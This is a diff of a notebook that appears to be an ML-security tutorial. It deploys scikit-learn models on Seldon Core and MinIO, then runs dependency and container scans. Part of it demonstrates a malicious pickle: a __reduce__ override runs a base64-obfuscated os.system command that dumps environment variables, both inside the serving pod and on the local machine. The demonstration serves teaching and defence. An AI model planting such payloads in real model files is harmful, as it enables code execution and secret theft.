@@ -63,6 +63,13 @@ Requirements on CLIs
 !istioctl install -y
 ```
 
+    [32m✔[0m Istio core installed                                                          
+    [32m✔[0m Istiod installed                                                              
+    [32m✔[0m Ingress gateways installed                                                    
+    [32m✔[0m Installation complete                                                         
+    Thank you for installing Istio 1.11.  Please take a few minutes to tell us about your install/upgrade experience!  https://forms.gle/kWULBRjUv7hHci7T6
+
+
 
 ```bash
 %%bash
@@ -84,6 +91,9 @@ spec:
 END
 ```
 
+    gateway.networking.istio.io/seldon-gateway created
+
+
 #### Setup Seldon Core
 
 
@@ -98,6 +108,18 @@ helm upgrade --install \
     --version 1.13.1
 ```
 
+    Release "seldon-core" has been upgraded. Happy Helming!
+    NAME: seldon-core
+    LAST DEPLOYED: Mon Apr 11 21:04:42 2022
+    NAMESPACE: seldon-system
+    STATUS: deployed
+    REVISION: 2
+    TEST SUITE: None
+
+
+    Error from server (AlreadyExists): namespaces "seldon-system" already exists
+
+
 #### Setup & configure MinIO
 
 
@@ -105,45 +127,13 @@ helm upgrade --install \
 %%bash
 kubectl create ns minio-system
 helm repo add minio https://helm.min.io/
-helm install minio minio/minio \
+helm upgrade --install minio minio/minio \
     --set accessKey=minioadmin \
     --set secretKey=minioadmin \
     --namespace minio-system
 ```
 
-    "minio" already exists with the same configuration, skipping
-    NAME: minio
-    LAST DEPLOYED: Sun Apr 10 13:24:52 2022
-    NAMESPACE: minio-system
-    STATUS: deployed
-    REVISION: 1
-    TEST SUITE: None
-    NOTES:
-    Minio can be accessed via port 9000 on the following DNS name from within your cluster:
-    minio.minio-system.svc.cluster.local
-    
-    To access Minio from localhost, run the below commands:
-    
-      1. export POD_NAME=$(kubectl get pods --namespace minio-system -l "release=minio" -o jsonpath="{.items[0].metadata.name}")
-    
-      2. kubectl port-forward $POD_NAME 9000 --namespace minio-system
-    
-    Read more about port forwarding here: http://kubernetes.io/docs/user-guide/kubectl/kubectl_port-forward/
-    
-    You can now access Minio server on http://localhost:9000. Follow the below steps to connect to Minio server with mc client:
-    
-      1. Download the Minio mc client - https://docs.minio.io/docs/minio-client-quickstart-guide
-    
-      2. Get the ACCESS_KEY=$(kubectl get secret minio -o jsonpath="{.data.accesskey}" | base64 --decode) and the SECRET_KEY=$(kubectl get secret minio -o jsonpath="{.data.secretkey}" | base64 --decode)
-    
-      3. mc alias set minio-local http://localhost:9000 "$ACCESS_KEY" "$SECRET_KEY" --api s3v4
-    
-      4. mc ls minio-local
-    
-    Alternately, you can use your browser or the Minio SDK to access the server - https://docs.minio.io/categories/17
-
-
-    Error from server (AlreadyExists): namespaces "minio-system" already exists
+    Process is interrupted.
 
 
 Once minio is runnning you need to open another terminal and run:
@@ -280,8 +270,11 @@ joblib.dump(model, "fml-artifacts/safe/model.joblib")
 
 
 ```python
-!bat fml-artifacts/safe/model.joblib
+with open("fml-artifacts/safe/model.joblib", "rb") as f: print(f.readlines())
 ```
+
+    [b'\x80\x03csklearn.linear_model._logistic\n', b'LogisticRegression\n', b'q\x00)\x81q\x01}q\x02(X\x07\x00\x00\x00penaltyq\x03X\x02\x00\x00\x00l2q\x04X\x04\x00\x00\x00dualq\x05\x89X\x03\x00\x00\x00tolq\x06G?\x1a6\xe2\xeb\x1cC-X\x01\x00\x00\x00Cq\x07G?\xf0\x00\x00\x00\x00\x00\x00X\r\x00\x00\x00fit_interceptq\x08\x88X\x11\x00\x00\x00intercept_scalingq\tK\x01X\x0c\x00\x00\x00class_weightq\n', b'NX\x0c\x00\x00\x00random_stateq\x0bNX\x06\x00\x00\x00solverq\x0cX\t\x00\x00\x00liblinearq\rX\x08\x00\x00\x00max_iterq\x0eKdX\x0b\x00\x00\x00multi_classq\x0fX\x03\x00\x00\x00ovrq\x10X\x07\x00\x00\x00verboseq\x11K\x00X\n', b'\x00\x00\x00warm_startq\x12\x89X\x06\x00\x00\x00n_jobsq\x13NX\x08\x00\x00\x00l1_ratioq\x14NX\x0e\x00\x00\x00n_features_in_q\x15K\x04X\x08\x00\x00\x00classes_q\x16cjoblib.numpy_pickle\n', b'NumpyArrayWrapper\n', b'q\x17)\x81q\x18}q\x19(X\x08\x00\x00\x00subclassq\x1acnumpy\n', b'ndarray\n', b'q\x1bX\x05\x00\x00\x00shapeq\x1cK\x03\x85q\x1dX\x05\x00\x00\x00orderq\x1eh\x07X\x05\x00\x00\x00dtypeq\x1fcnumpy\n', b'dtype\n', b'q X\x02\x00\x00\x00i8q!\x89\x88\x87q"Rq#(K\x03X\x01\x00\x00\x00<q$NNNJ\xff\xff\xff\xffJ\xff\xff\xff\xffK\x00tq%bX\n', b'\x00\x00\x00allow_mmapq&\x88ub\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00X\x05\x00\x00\x00coef_q\'h\x17)\x81q(}q)(h\x1ah\x1bh\x1cK\x03K\x04\x86q*h\x1eX\x01\x00\x00\x00Fq+h\x1fh X\x02\x00\x00\x00f8q,\x89\x88\x87q-Rq.(K\x03h$NNNJ\xff\xff\xff\xffJ\xff\xff\xff\xffK\x00tq/bh&\x88ub, ?T\xff@\xda?\xf6_5nM\\\xdb?.z\xa2\x86\xfbQ\xfb\xbf\x0bh|N5m\xf7?w\xfa$3:\xcb\xf9\xbf\xbc\x99m\xbff\x8c\xf8\xbf{\xc8\x01\x01\x8c\x14\x02\xc0l\xcb\xc4e\x18m\xe2?\xb3s\x82\xa2\x8a\xc4\x03@`\xf08\xe4(V\xf0\xbf"\\}\x85\xaf\x7f\xf6\xbf\x03M#\n', b'fq\x04@X\n', b"\x00\x00\x00intercept_q0h\x17)\x81q1}q2(h\x1ah\x1bh\x1cK\x03\x85q3h\x1eh\x07h\x1fh.h&\x88ub\xb5~?\xd6\xf4\xe8\xd0?\x8d\xd5\xfc'\xb7\x80\xf1??\xc3\xdc\xe0ro\xf3\xbfX\x07\x00\x00\x00n_iter_q4h\x17)\x81q5}q6(h\x1ah\x1bh\x1cK\x01\x85q7h\x1eh\x07h\x1fh X\x02\x00\x00\x00i4q8\x89\x88\x87q9Rq:(K\x03h$NNNJ\xff\xff\xff\xffJ\xff\xff\xff\xffK\x00tq;bh&\x88ub\x07\x00\x00\x00X\x10\x00\x00\x00_sklearn_versionq<X\x06\x00\x00\x000.24.2q=ub."]
+
 
 #### Deploy the model
 
@@ -290,7 +283,7 @@ joblib.dump(model, "fml-artifacts/safe/model.joblib")
 !mc cp -r fml-artifacts/ minio-seldon/fml-artifacts/
 ```
 
-    ...el.joblib:  1.08 KiB / 1.08 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 127.81 KiB/s 0s[0m[0m[m[32;1m
+    ...el.joblib:  1.05 KiB / 1.05 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 85.54 KiB/s 0s[0m[0m
 
 
 ```bash
@@ -311,16 +304,15 @@ spec:
 END
 ```
 
-    seldondeployment.machinelearning.seldon.io/model-safe unchanged
+    seldondeployment.machinelearning.seldon.io/model-safe created
 
 
 
 ```python
-!kubectl get pods
+!kubectl get pods | grep model-safe
 ```
 
-    NAME                                              READY   STATUS    RESTARTS   AGE
-    model-safe-default-0-classifier-774975578-kt7bg   2/2     Running   0          33s
+    model-safe-default-0-classifier-68f495d845-xwrkm     2/2     Running   0          6m17s
 
 
 
@@ -328,6 +320,7 @@ END
 import requests
 
 url = "http://localhost:80/seldon/default/model-safe/api/v1.0/predictions"
+
 requests.post(url, json={"data": {"ndarray": [[1,2,3,4]]}}).json()
 ```
 
@@ -338,7 +331,7 @@ requests.post(url, json={"data": {"ndarray": [[1,2,3,4]]}}).json()
       'ndarray': [[0.0006985194531162835,
         0.00366803903943666,
         0.995633441507447]]},
-     'meta': {'requestPath': {'classifier': 'seldonio/sklearnserver:1.14.0-dev'}}}
+     'meta': {'requestPath': {'classifier': 'seldonio/sklearnserver:1.13.1'}}}
 
 
 
@@ -368,7 +361,7 @@ model_safe.predict(X[:1])
 import types, os, base64
 
 def __reduce__(self):
-    # This is basically cmd = "env > pwnd.txt"
+    # This is basically base64 for cmd = "env > pwnd.txt"
     cmd = base64.b64decode("ZW52ID4gcHduZC50eHQ=").decode() 
     return os.system, (cmd,)
 ```
@@ -397,8 +390,11 @@ joblib.dump(model_safe, "fml-artifacts/unsafe/model.joblib")
 
 
 ```python
-!bat fml-artifacts/unsafe/model.joblib
+with open("fml-artifacts/unsafe/model.joblib", "rb") as f: print(f.readlines())
 ```
+
+    [b'\x80\x03cposix\n', b'system\n', b'q\x00X\x0e\x00\x00\x00env > pwnd.txtq\x01\x85q\x02Rq\x03.']
+
 
 #### Deploy the model
 
@@ -407,7 +403,7 @@ joblib.dump(model_safe, "fml-artifacts/unsafe/model.joblib")
 !mc cp -r fml-artifacts/ minio-seldon/fml-artifacts/
 ```
 
-    ...el.joblib:  1.05 KiB / 1.05 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 115.81 KiB/s 0s[0m[0m
+    ...el.joblib:  1.05 KiB / 1.05 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 126.77 KiB/s 0s[0m[0m
 
 
 ```bash
@@ -437,8 +433,8 @@ END
 ```
 
     NAME                                                 READY   STATUS    RESTARTS   AGE
-    model-safe-default-0-classifier-774975578-kt7bg      2/2     Running   0          5m35s
-    model-unsafe-default-0-classifier-6c9699c8c9-rg24t   2/2     Running   0          2m27s
+    model-safe-default-0-classifier-68f495d845-xwrkm     2/2     Running   0          6m35s
+    model-unsafe-default-0-classifier-85969ff86c-rtwt5   2/2     Running   0          39s
 
 
 
@@ -451,8 +447,8 @@ kubectl exec $UNSAFE_POD -c classifier -- head -5 pwnd.txt
     SERVICE_TYPE=MODEL
     LC_ALL=C.UTF-8
     MODEL_UNSAFE_DEFAULT_SERVICE_PORT_GRPC=5001
-    MODEL_UNSAFE_DEFAULT_SERVICE_PORT_HTTP=8000
     MODEL_SAFE_DEFAULT_PORT_5001_TCP_PROTO=tcp
+    MODEL_UNSAFE_DEFAULT_SERVICE_PORT_HTTP=8000
 
 
 #### Now reload the insecure pickle
@@ -478,7 +474,7 @@ model_unsafe = joblib.load("fml-artifacts/unsafe/model.joblib")
 ```
 
     CONDA_PROMPT_MODIFIER=(base) 
-    TMUX=/tmp/tmux-1000/default,97,0
+    TMUX=/tmp/tmux-1000/default,98,0
     PYSPARK_DRIVER_PYTHON=jupyter
     USER=alejandro
 
@@ -518,13 +514,6 @@ model_unsafe = joblib.load("fml-artifacts/unsafe/model.joblib")
 ```python
 !pip install pipdeptree
 ```
-
-    Collecting pipdeptree
-      Using cached pipdeptree-2.2.1-py3-none-any.whl (21 kB)
-    Requirement already satisfied: pip>=6.0.0 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from pipdeptree) (22.0.4)
-    Installing collected packages: pipdeptree
-    Successfully installed pipdeptree-2.2.1
-
 
 
 ```python
@@ -900,6 +889,29 @@ docker run --rm \
 ```
 
     "Project","ScanDate","DependencyName","DependencyPath","Description","License","Md5","Sha1","Identifiers","CPE","CVE","CWE","Vulnerability","Source","CVSSv2_Severity","CVSSv2_Score","CVSSv2","CVSSv3_BaseSeverity","CVSSv3_BaseScore","CVSSv3","CPE Confidence","Evidence Count"
+
+
+## Container Scan
+
+
+```python
+!trivy image --severity CRITICAL seldonio/sklearnserver:1.14.0-dev
+```
+
+    2022-04-11T19:29:06.350+0100	[34mINFO[0m	Detected OS: redhat
+    2022-04-11T19:29:06.350+0100	[34mINFO[0m	Detecting RHEL/CentOS vulnerabilities...
+    2022-04-11T19:29:06.404+0100	[34mINFO[0m	Number of language-specific files: 1
+    2022-04-11T19:29:06.404+0100	[34mINFO[0m	Detecting python-pkg vulnerabilities...
+    
+    seldonio/sklearnserver:1.14.0-dev (redhat 8.5)
+    ==============================================
+    Total: 0 (CRITICAL: 0)
+    
+    
+    Python (python-pkg)
+    ===================
+    Total: 0 (CRITICAL: 0)
+    
 
 
 
